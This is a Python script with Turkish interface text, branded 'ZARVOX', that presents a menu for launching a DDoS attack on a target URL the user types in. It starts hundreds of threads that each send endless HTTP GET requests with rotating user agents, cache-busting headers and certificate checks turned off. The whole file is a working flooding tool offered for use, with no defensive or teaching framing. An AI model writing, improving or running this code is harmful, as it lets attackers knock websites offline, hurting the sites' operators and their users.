import threading
import requests
import random
import time
import os
import sys
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- OTOMATİK KURULUM FONKSİYONU ---
def setup_pip():
    clear()
    print(Fore.CYAN + " [!] Gerekli kütüphaneler kontrol ediliyor ve kuruluyor...\n")
    libraries = ["requests", "colorama"]
    for lib in libraries:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
            print(Fore.GREEN + f" [+] {lib} başarıyla kuruldu/güncellendi.")
        except Exception as e:
            print(Fore.RED + f" [X] {lib} kurulurken hata oluştu: {e}")
    
    print(Fore.YELLOW + "\n [!] Kurulum tamamlandı. 3 saniye içinde ana menüye dönülüyor...")
    time.sleep(3)
    login()

def banner():
    clear()
    # Şekilli ZARVOX Logosu
    print(Fore.RED + Style.BRIGHT + r"""
  ______  ___  ______  _   _  _____ __   __
 |___  / / _ \ | ___ \| | | ||  _  |\ \ / /
    / / / /_\ \| |_/ /| | | || | | | \ V / 
   / /  |  _  ||    / | | | || | | | / ^ \ 
 ./ /___| | | || |\ \ \ \_/ /\ \_/ // / \ \
 \_____/\_| |_/\_| \_| \___/  \___/ \_/ \_/
    """)
    print(Fore.CYAN + "      --- Tool Login --- By ZARVOX")
    print(Fore.WHITE + "------------------------------------------------")

def login():
    banner()
    print(Fore.YELLOW + " [1] Tool Login (DDoS Başlat)")
    print(Fore.YELLOW + " [2] Setup (Gerekli kütüphaneleri kur)")
    print(Fore.YELLOW + " [3] Exit (Çıkış)")
    
    choice = input(Fore.WHITE + "\n Seçim yapın: ")
    
    if choice == "1":
        target_screen()
    elif choice == "2":
        setup_pip()
    elif choice == "3":
        print(Fore.RED + " [!] Çıkış yapılıyor...")
        sys.exit()
    else:
        print(Fore.RED + " [!] Geçersiz seçim!")
        time.sleep(1)
        login()

def target_screen():
    banner()
    try:
        target = input(Fore.GREEN + " Hedef URL (örn: http://site.com): ")
        if not target.startswith("http"):
            print(Fore.RED + " [!] Hata: URL 'http' veya 'https' ile başlamalıdır!")
            time.sleep(2)
            target_screen()
            
        threads = int(input(Fore.GREEN + " Thread Sayısı (Önerilen 500-1000): "))
        
        print(Fore.RED + f"\n [!] {target} hedefine saldırı başlatılıyor...")
        time.sleep(2)
        start_attack(target, threads)
    except ValueError:
        print(Fore.RED + " [!] Lütfen geçerli bir sayı girin!")
        time.sleep(2)
        target_screen()

# --- SALDIRI MOTORU ---
def attack(target, user_agents):
    while True:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Cache-Control': 'no-cache',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive'
            }
            # requests.get ile gerçek HTTP trafiği
            response = requests.get(target, headers=headers, timeout=5, verify=False)
            print(Fore.GREEN + f" [+] Paket Gönderildi -> {target} | Status: {response.status_code}")
        except:
            print(Fore.RED + " [X] Sunucu Çöktü veya Bağlantı Reddedildi!")
            pass

def start_attack(target, thread_count):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X)"
    ]
    
    for i in range(thread_count):
        t = threading.Thread(target=attack, args=(target, user_agents))
        t.daemon = True
        t.start()
        
    while True:
        time.sleep(1)

if __name__ == "__main__":
    login()